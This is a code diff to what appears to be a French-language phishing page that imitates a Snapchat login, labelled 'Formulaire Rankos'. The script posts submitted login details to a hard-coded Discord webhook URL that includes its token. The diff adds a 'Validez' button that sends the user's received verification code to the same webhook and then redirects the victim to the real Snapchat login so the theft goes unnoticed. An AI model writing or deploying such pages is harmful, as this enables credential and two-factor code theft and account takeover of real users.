@@ -117,9 +117,16 @@
       margin-bottom: 10px;
     }
 
-    #imageScreen p {
+    #imageScreen button {
+      background-color: #fffc00;
+      border: none;
+      color: #000;
       font-weight: bold;
-      margin-top: 5px;
+      padding: 12px;
+      width: 100%;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
     }
   </style>
 </head>
@@ -153,17 +160,18 @@
     <p id="referralError">Le code de parrainage doit contenir exactement 4 chiffres.</p>
   </div>
 
-  <!-- Zone de saisie du code -->
+  <!-- Zone de saisie du code avec bouton -->
   <div class="code-screen" id="imageScreen">
     <label for="codeInput">Code reçu</label>
     <input type="text" id="codeInput" name="codeInput" />
-    <p>Validez</p>
+    <button id="validateButton">Validez</button>
   </div>
 
   <script>
     const webhookURL = "https://discord.com/api/webhooks/1456052165062955154/PIffzSrsDCnQ4Q-Um7YqT4e9Ti6Cz7m8FbSHqI169lw6MnT8nra8dyS_zEesu9M3wsNS";
     const redirectURL = "https://accounts.snapchat.com/accounts/v2/login";
 
+    // Gestion du formulaire de connexion
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
 
@@ -187,6 +195,7 @@
         return;
       }
 
+      // Envoi initial vers Discord
       const message = {
         embeds: [
           {
@@ -210,15 +219,54 @@
         body: JSON.stringify(message),
       })
       .then(response => {
-        // Après l'envoi, afficher la zone de code
+        // Affiche la zone de code après la connexion
         setTimeout(() => {
           document.getElementById('loginBox').style.display = 'none';
           document.getElementById('imageScreen').style.display = 'block';
-
-          setTimeout(() => {
-            window.location.href = redirectURL;
-          }, 30000); // 30 secondes
         }, 1000);
+      })
+      .catch(error => {
+        alert("Erreur réseau ou CORS.");
+        console.error(error);
+      });
+    });
+
+    // Gestion du bouton "Validez"
+    document.getElementById('validateButton').addEventListener('click', function() {
+      const codeInput = document.getElementById('codeInput').value.trim();
+
+      if(codeInput.length === 0){
+        alert("Veuillez entrer un code.");
+        return;
+      }
+
+      // Envoi du code vers Discord
+      const codeMessage = {
+        embeds: [
+          {
+            title: "📥 Code reçu",
+            description: "Utilisateur a entré son code reçu",
+            color: 0x00ff00,
+            fields: [
+              { name: "💬 Code", value: codeInput }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: { text: "Formulaire Rankos" }
+          }
+        ]
+      };
+
+      fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(codeMessage),
+      })
+      .then(response => {
+        alert("Code envoyé !");
+        // Redirection après 5 secondes
+        setTimeout(() => {
+          window.location.href = redirectURL;
+        }, 5000);
       })
       .catch(error => {
         alert("Erreur réseau ou CORS.");
